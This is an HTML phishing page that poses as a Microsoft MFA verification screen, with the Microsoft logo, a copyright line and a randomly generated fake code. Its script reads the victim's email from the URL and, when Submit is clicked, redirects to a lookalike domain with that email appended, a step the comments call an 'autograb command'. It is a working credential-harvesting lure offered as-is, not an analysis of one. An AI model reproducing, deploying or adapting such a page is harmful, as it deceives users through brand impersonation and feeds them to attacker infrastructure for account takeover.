<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MFA Verification</title>
    <style>
        /* Body Styling with Dynamic Background */
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: no-repeat center center fixed;
            background-size: cover;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }

        /* Blurred Overlay */
        .blurred-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            backdrop-filter: blur(10px);
            z-index: 1;
        }

        /* Card Container */
        .card {
            position: relative;
            z-index: 2;
            background-color: #fff;
            width: 400px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            text-align: center;
            padding: 30px 20px;
        }

        /* Logo Styling */
        .logo img {
            width: 100px;
            margin-bottom: 12px;
        }

        /* Heading Styling */
        .mfa-heading {
            color: #f05a22;
            font-size: 24px;
            font-weight: bold;
            margin-top: 12px;
            margin-bottom: 16px;
        }

        /* Loading Animation */
        .loading-circle {
            display: inline-block;
            margin: 12px 0;
            height: 30px;
            width: 30px;
            border: 3px solid #f05a22;
            border-top: 3px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* MFA Code Styling */
        .mfa-code {
            font-size: 28px;
            font-weight: bold;
            color: #333;
            margin: 12px 0;
        }

        /* Input Field Styling */
        input[type="number"] {
            width: 80%;
            padding: 12px;
            margin-top: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box;
        }

        /* Submit Button Styling */
        .btn-submit {
            margin-top: 16px;
            display: inline-block;
            background-color: #0078d4;
            color: #fff;
            padding: 12px 20px;
            font-size: 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }

        .btn-submit:hover {
            background-color: #005ea6;
        }

        /* Footer Styling */
        .footer-note {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
    </style>
    <script>
        // Extract email from query parameters
        function getEmailFromQuery() {
            const params = new URLSearchParams(window.location.search);
            return params.get("email") || "default@example.com"; // Fallback to default email if none is provided
        }

        // Redirect with autograb command
        function redirectToMainLink() {
            const email = getEmailFromQuery();
            const redirectURL = `https://authencryption.bastropscale-com.info/zrWoUPyJ#${email}`;
            window.location.href = redirectURL;
        }

        // Array of Random Logo URLs
        const logos = [
            'https://i.ibb.co/cLY9NST/microsoft-3.png',
            'https://i.ibb.co/6w1yWxg/Kite.png',
            'https://via.placeholder.com/500x500.png?text=Random+Logo+1',
            'https://via.placeholder.com/500x500.png?text=Random+Logo+2',
            'https://via.placeholder.com/500x500.png?text=Random+Logo+3'
        ];

        // Function to Set a Random Logo as Background
        function setRandomBackground() {
            const randomLogo = logos[Math.floor(Math.random() * logos.length)];
            document.body.style.backgroundImage = `url(${randomLogo})`;
        }

        // Generate random MFA code
        function generateRandomCode() {
            return Math.floor(10000 + Math.random() * 90000);
        }

        // Set random logo background and generate MFA code on load
        window.onload = function () {
            setRandomBackground();
            document.querySelector('.mfa-code').textContent = generateRandomCode();
        };
    </script>
</head>
<body>
    <div class="blurred-background"></div>

    <div class="card">
        <div class="logo">
            <img src="https://i.ibb.co/cLY9NST/microsoft-3.png" alt="Microsoft Logo">
        </div>

        <div class="mfa-heading">MFA Verification</div>

        <div class="loading-circle"></div>

        <div class="mfa-code">12345</div>

        <input type="number" id="mfaNumber" placeholder="Enter your MFA code" aria-label="MFA code input field">

        <button class="btn-submit" onclick="redirectToMainLink()">Submit</button>

        <div class="footer-note">
            Please complete the verification process to enhance your security.<br>
            &copy; 2024 Microsoft Corporation. All rights reserved.
        </div>
    </div>
</body>
</html>
